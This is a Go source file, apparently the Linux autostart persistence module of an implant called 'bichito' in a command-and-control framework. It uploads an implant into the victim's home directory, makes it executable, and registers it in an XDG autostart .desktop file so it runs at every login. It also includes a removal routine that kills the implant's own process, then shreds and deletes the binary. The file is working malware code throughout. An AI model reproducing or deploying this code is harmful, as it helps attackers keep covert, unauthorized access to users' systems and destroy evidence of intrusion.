// +build linuxautostart


package persistence

import (
	"bichito/modules/biterpreter"
	"encoding/json"
	"os"
	"os/user"
	"fmt"
	"strconv"
)

type BiPersistenceAutoStart struct {
	Path string   `json:"implantpath"`
	AutostartName string   `json:"autostartname"`
}

func AddPersistence(jsonPersistence string,blob string) (bool,string){

	var moduleParams *BiPersistenceAutoStart

	errDaws := json.Unmarshal([]byte(jsonPersistence),&moduleParams)
	if errDaws != nil{
		return true,"Error Decoding Persistence Module Params:" + errDaws.Error()
	}

    usr, err := user.Current()
    if err != nil {
        return true,"Error Getting User Context:" + err.Error()
    }

	//Fix Implant Path and set it hidden by default
	implantPath := usr.HomeDir +"/"+ moduleParams.Path

    //Fix where the AutoStart file need to be palced 
    var autostartPath string

    value := os.Getenv("XDG_CONFIG_HOME")
    if len(value) == 0 {
		
		err1,errString1 := CreateDirIfNotExist(usr.HomeDir + "/.config")
		if err1 {
			return true,"Error Creating .config:" + errString1.Error()
		}

		err2,errString2 := CreateDirIfNotExist(usr.HomeDir + "/.config/autostart/")
		
		if err2 {
			return true,"Error Creating .config:" + errString2.Error()
		}
		autostartPath = usr.HomeDir +"/.config/autostart/"+moduleParams.AutostartName+".desktop"

	}else{

		err1,errString1 := CreateDirIfNotExist(value + "/.config")
		if err1 {
			return true,"Error Creating .config:" + errString1.Error()
		}

		err2,errString2 := CreateDirIfNotExist(value  + "/.config/autostart/")
		
		if err2 {
			return true,"Error Creating .config:" + errString2.Error()
		}

    	autostartPath = value +"/.config/autostart/"+moduleParams.AutostartName+".desktop"

    }
    //Create Autostart string and write on path
	autostart_string :=
		fmt.Sprintf(
		`
		[Desktop Entry] 

		Type=Application

		Exec=%s
		`,implantPath)

	autostartFile, err := os.Create(autostartPath)
	if err != nil {
		return true,"Error Creating Autostart file:" + err.Error()
	}

	if _, err = autostartFile.WriteString(autostart_string); err != nil {
		return true,"Error Writing Autostart file::" + err.Error()
	}	

	defer autostartFile.Close()

	errUpload,stringErr := biterpreter.Upload(implantPath,blob)
	if errUpload{
		return true,"Error Uploading Implant on Persistence:" + stringErr
	}


	if err = os.Chmod(implantPath, 0755); err != nil {
		return true,"Error Writing Implant file:" + err.Error()
	}


    return false,"Persisted"
}

func CheckPersistence(jsonPersistence string) (bool,string){

	var moduleParams *BiPersistenceAutoStart

	errDaws := json.Unmarshal([]byte(jsonPersistence),&moduleParams)
	if errDaws != nil{
		return true,"Error Decoding Persistence Module Params:" + errDaws.Error()
	}

    usr, err := user.Current()
    if err != nil {
        return true,"Error Getting User Context:" + err.Error()
    }

    var implantExists bool
	//Fix Implant Path and set it hidden by default
	implantPath := usr.HomeDir +"/"+ moduleParams.Path

	implantExists,errI := exists(implantPath)
	if errI != nil {
		return true,"Error Checking Implant File Existence:" + errI.Error()
	}

    //Fix where the AutoStart file need to be palced 
    var autostartPath string
    var autostartExists bool

    value := os.Getenv("XDG_CONFIG_HOME")
    if len(value) == 0 {
		var errA error
		autostartPath = usr.HomeDir +"/.config/autostart/"+moduleParams.AutostartName+".desktop"
		autostartExists,errA = exists(autostartPath)
		if errA != nil {
			return true,"Error Checking Autostart existence:" + errA.Error()
		}

    }else{
    	var errA error
    	autostartPath = value +"/.config/autostart/"+moduleParams.AutostartName+".desktop"
    	autostartExists,errA = exists(autostartPath)
		if errA != nil {
			return true,"Error Checking Autostart existence:" + errA.Error()
		}
    }

    var res string
    if (implantExists || autostartExists){
    	res = "Persisted"
    }else{
    	res = "Non Persisted"
    }

    return false,res
}


func RemovePersistence(jsonPersistence string) (bool,string){

	var moduleParams *BiPersistenceAutoStart

	errDaws := json.Unmarshal([]byte(jsonPersistence),&moduleParams)
	if errDaws != nil{
		return true,"Error Decoding Persistence Module Params:" + errDaws.Error()
	}

    usr, err := user.Current()
    if err != nil {
        return true,"Error Getting User Context:" + err.Error()
    }


	//Fix Implant Path and set it hidden by default
	implantPath := usr.HomeDir +"/"+ moduleParams.Path

    //Fix where the AutoStart file need to be palced 
    var autostartPath string

    value := os.Getenv("XDG_CONFIG_HOME")
    if len(value) == 0 {
		
		autostartPath = usr.HomeDir +"/.config/autostart/"+moduleParams.AutostartName+".desktop"

    }else{
    	autostartPath = value +"/.config/autostart/"+moduleParams.AutostartName+".desktop"
    }

    var genError string
    //Remove Autostart
    errW,errString := biterpreter.Wipe(autostartPath)
    if errW != false {
		genError = "Error Removing AutoStart:" + errString
    }

    //Set a Job on the os to kill Implant and remove it from disk
    //Get actual PID, and then exec --> kill -9 PID;sleep 5;shred implantPath;rm implantPath
	
	s := strconv.Itoa(os.Getpid())
	execErr,stringerr := biterpreter.Exec("kill -9 "+s+";sleep 5;shred "+implantPath+";rm "+implantPath)
	if execErr != false {
		genError = genError + "Implant Removed Already:" + stringerr
	}


    if (errW != false) || (execErr != false){

    	return true,"Schtasks Error:" + genError
    }


    return false,"Persistence Removed"

}


func exists(path string) (bool, error) {
    _, err := os.Stat(path)
    if err == nil { return true, nil }
    if os.IsNotExist(err) { return false, nil }
    return true, err
}


func CreateDirIfNotExist(dir string) (bool,error){
	var err error
	if _, err := os.Stat(dir); os.IsNotExist(err) {
    	err = os.MkdirAll(dir, 0755)
			if err != nil {
              	return true,err
            }
    }

	return false,err

}